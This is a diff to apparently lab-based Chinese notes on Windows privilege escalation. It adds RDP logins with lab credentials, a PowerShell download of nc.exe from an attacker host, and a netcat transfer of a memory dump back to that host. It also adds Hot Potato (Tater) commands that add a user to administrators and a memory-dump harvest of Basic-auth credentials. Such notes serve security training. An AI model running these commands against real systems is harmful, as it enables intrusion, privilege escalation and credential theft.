@@ -1,10 +1,27 @@
 
 # rdp连接
 user登录
-> rdesktop -u user -p password321 10.10.68.121 -r sound:on -g workarea
+> rdesktop -u user -p password321 10.10.54.152 -r sound:on -g workarea
 
 TCM登录
-> rdesktop -u TCM -p Hacker123 10.10.68.121 -r sound:on -g workarea
+> rdesktop -u TCM -p Hacker123 10.10.54.152 -r sound:on -g workarea
+
+
+为了方便起见，应该先传一些实用工具到靶机。
+
+1. 传nc.exe到靶机
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/nc.exe','C:\temp\nc.exe')
+
+2. 从靶机传文件回kali
+
+接收端：
+> nc -nlp 9995 -vv > iexplore.DMP
+
+发送端：（需在cmd下）
+nc -n 10.13.21.169 9995 < iexplore.DMP
+
+
 
 # 1.注册表提权-自动运行（ Registry Escalation - Autorun）
 
@@ -383,3 +400,72 @@ windows读取的应该是```C:\Program Files\topservice folder\subservice subfol
 
 3. 重启服务
 > sc start 服务名称
+
+
+# 9.热土豆升级（ Potato Escalation - Hot Potato）
+
+> Hot Potato主要由三大部分组成，每一部分都对应一个已知类型的攻击技术，这些技术并不算新颖，但是使用这些技术的方式却令人耳目一新。微软已经深知这些攻击技术，不幸的是，在不破坏系统向后兼容性的情况下，这些问题很难被修复，所以攻击者已经使用这些技术很多年了。
+
+## 如何利用
+
+1. 调出powershell
+> powershell.exe -nop -ep bypass
+
+2. 引入热土豆模块(脚本在[这里](https://github.com/Kevin-Robertson/Tater))
+> Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+
+3. 执行自定义命令。把当前账号提权到管理员组
+>  Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+
+4. 查看
+> net localgroup administrators
+
+
+# 10.配置文件里的密码（Password Mining Escalation - Configuration Files）
+
+就是查找靶机里存有密码的配置文件，有些可能是明文，有些可能被加密了。
+
+
+# 11.内存文件里的密码
+
+## 如何利用
+
+kali端：
+首先用MSF开启一个监听
+> msfconsole
+
+> use auxiliary/server/capture/http_basic
+
+> set uripath x
+
+>  run
+
+此时生成一个http监听：```http://10.13.21.169/x```
+
+靶机：
+
+1. 访问上面的监听地址。
+
+2. 打开任务管理器
+> taskmgr
+
+3. 导出dumo file(Create Dump File)
+
+4. 把导出来的文件传回kali
+
+kali端：
+
+1. 用strings命令查看导出来的dump file,搜索Authorization: Basic
+> strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
+
+2. base64解密
+> echo -ne [Base64 String] | base64 -d
+
+
+# 12.内核提权（Kernel Exploits）
+
+1. 利用MSF里面的``` post/multi/recon/local_exploit_suggester```模块
+
+2. 自己编译提权脚本传到靶机执行。
+
+注意，内核提权有可能会损伤系统造成不可修复的破坏，在真实环境中应该作为最后谨慎使用的手段。
